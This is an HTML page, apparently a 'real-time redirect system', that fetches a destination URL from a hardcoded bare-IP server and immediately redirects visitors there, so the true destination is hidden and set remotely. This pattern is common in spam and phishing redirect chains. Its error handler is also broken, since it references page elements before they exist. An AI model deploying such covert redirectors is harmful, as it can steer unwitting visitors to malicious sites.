<!DOCTYPE html>
<html>
<head>
    <!-- 强制禁用所有缓存 -->
    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
    <meta http-equiv="Pragma" content="no-cache">
    <meta http-equiv="Expires" content="0">
    
    <meta charset="utf-8">
    <title>实时跳转系统</title>
    <script>
        (() => {
            // 配置参数
            const API_URL = `http://154.44.25.166/ym/ym.php?_=${Date.now()}`;
            
            // 显示加载状态
            const loader = document.getElementById('loader');
            const statusText = document.getElementById('status');

            fetch(API_URL, {
                cache: 'no-store',
                headers: {
                    'Pragma': 'no-cache',
                    'Cache-Control': 'no-cache'
                }
            })
            .then(response => {
                if (!response.ok) throw new Error(`HTTP错误 ${response.status}`);
                return response.json();
            })
            .then(data => {
                if (data.code !== 1 || !isValidUrl(data.data)) {
                    throw new Error('接口返回数据异常');
                }
                executeRedirect(data.data);
            })
            .catch(error => {
                loader.style.display = 'none';
                statusText.innerHTML = `
                    <h3 style="color:red">错误：${error.message}</h3>
                    <button onclick="window.location.reload(true)" style="
                        padding: 10px 20px;
                        background: #ff4444;
                        color: white;
                        border: none;
                        border-radius: 5px;
                        cursor: pointer;
                    ">立即重试</button>
                `;
            });

            function executeRedirect(url) {
                // 双重跳转保障
                window.location.replace(url);
                const meta = document.createElement('meta');
                meta.httpEquiv = "refresh";
                meta.content = `0; url=${url}`;
                document.head.appendChild(meta);
            }

            function isValidUrl(url) {
                try {
                    new URL(url);
                    return true;
                } catch {
                    return false;
                }
            }
        })();
    </script>
</head>
<body>
    <div style="text-align: center; margin-top: 100px;">
        <div id="loader" class="spinner"></div>
        <p id="status" style="font-size: 18px; color: #666;">正在获取实时链接...</p>
    </div>

    <style>
        .spinner {
            width: 40px;
            height: 40px;
            margin: 20px auto;
            border: 4px solid #f3f3f3;
            border-top: 4px solid #4285f4;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</body>
</html>
